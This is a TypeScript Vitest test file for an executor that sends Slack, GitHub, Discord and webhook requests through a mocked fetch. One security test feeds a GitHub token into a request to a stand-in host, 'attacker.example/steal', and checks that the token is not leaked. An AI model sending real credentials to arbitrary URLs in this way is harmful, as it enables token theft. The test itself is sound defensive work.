// v0.4.9: Real SaaS HTTP executor tests

import { describe, it, expect, vi } from 'vitest';
import { executeRealSaaSAction, type FetchLike } from '../src/registry/saas-http-executor.js';

function res(body: unknown, ok = true, status = 200) {
  return { ok, status, json: async () => body, text: async () => JSON.stringify(body) };
}

describe('executeRealSaaSAction', () => {
  it('sends a real Slack message and maps the response', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({ ok: true, ts: '167.89', channel: 'C1' }));
    const out = await executeRealSaaSAction(
      'slack',
      'send_message',
      { channel: 'C1', text: 'hi' },
      'xoxb-token',
      fetchImpl,
    );
    expect(out.handled).toBe(true);
    expect(out.data).toMatchObject({ channel: 'C1', message_id: '167.89', status: 'sent' });
    const [url, init] = fetchImpl.mock.calls[0] as unknown as [
      string,
      { headers: Record<string, string>; body: string },
    ];
    expect(url).toBe('https://slack.com/api/chat.postMessage');
    expect(init.headers.Authorization).toBe('Bearer xoxb-token');
    expect(JSON.parse(init.body)).toMatchObject({ channel: 'C1', text: 'hi' });
  });

  it('creates a real GitHub issue against the correct repo endpoint', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () =>
      res({ number: 42, state: 'open', html_url: 'https://github.com/o/r/issues/42' }),
    );
    const out = await executeRealSaaSAction(
      'github',
      'create_issue',
      { owner: 'o', repo: 'r', title: 'Bug', body: 'desc' },
      'ghp_token',
      fetchImpl,
    );
    expect(out.handled).toBe(true);
    expect(out.data).toMatchObject({ issue_number: 42, state: 'open' });
    const ghUrl = (fetchImpl.mock.calls[0] as unknown as [string])[0];
    expect(ghUrl).toBe('https://api.github.com/repos/o/r/issues');
  });

  it('posts to a Discord webhook when a webhook_url is given', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({}, true, 204));
    const out = await executeRealSaaSAction(
      'discord',
      'send_message',
      { webhook_url: 'https://discord.com/api/webhooks/1/abc', content: 'hello' },
      'token',
      fetchImpl,
    );
    expect(out.handled).toBe(true);
    expect(out.data).toMatchObject({ status: 'sent', http_status: 204 });
  });

  it('returns handled=false when no access token is present', async () => {
    const out = await executeRealSaaSAction('slack', 'send_message', {}, '', vi.fn());
    expect(out.handled).toBe(false);
  });

  it('returns handled=false for an app/action with no real handler', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({}));
    const out = await executeRealSaaSAction('bamboohr', 'list_employees', {}, 'token', fetchImpl);
    expect(out.handled).toBe(false);
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('handles a generic outgoing webhook http_request', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({ received: true }));
    const out = await executeRealSaaSAction(
      'webhook',
      'http_request',
      { url: 'https://example.com/hook', method: 'POST', body: { x: 1 } },
      'token',
      fetchImpl,
    );
    expect(out.handled).toBe(true);
    expect(out.data).toMatchObject({ status: 'ok', http_status: 200 });
  });

  it('SECURITY: does not leak another app token via http_request to an arbitrary URL', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({}));
    const out = await executeRealSaaSAction(
      'github',
      'http_request',
      { url: 'https://attacker.example/steal' },
      'ghp_secret_token',
      fetchImpl,
    );
    expect(out.handled).toBe(false);
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('does not fire an add_comment request when the issue number is missing', async () => {
    const fetchImpl = vi.fn<FetchLike>(async () => res({}));
    const out = await executeRealSaaSAction(
      'github',
      'add_comment',
      { owner: 'o', repo: 'r', body: 'hi' },
      'ghp_token',
      fetchImpl,
    );
    expect(out.handled).toBe(false);
    expect(fetchImpl).not.toHaveBeenCalled();
  });
});
